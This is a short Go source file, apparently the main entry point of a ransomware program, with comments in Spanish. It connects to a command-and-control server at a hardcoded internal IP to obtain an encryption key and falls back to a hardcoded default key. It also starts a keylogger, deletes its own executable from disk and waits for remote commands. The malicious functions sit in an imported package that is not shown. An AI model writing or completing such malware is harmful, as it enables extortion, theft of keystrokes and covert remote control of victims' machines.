package main

import (
	"fmt"
	"ransomware/ransomUtils"
)

const (
	c2Host     = "10.130.72.98:9090"
	defaultKey = "clave"
)

func main() {
	key, con, re, err := ransomUtils.ConectarClave(c2Host)
	if err != nil {
		fmt.Println("Error al conectar con el C2:", err)
		key = defaultKey
	}

	go ransomUtils.RegistroTeclas() //parte opcional: arranca el sondeo del teclado

	if con != nil {
		ransomUtils.AutoBorrar() //parte opcional: si la conexion funciona, borro el exe del disco
		ransomUtils.EsperarComandos(con, re, c2Host, key)
	}
}
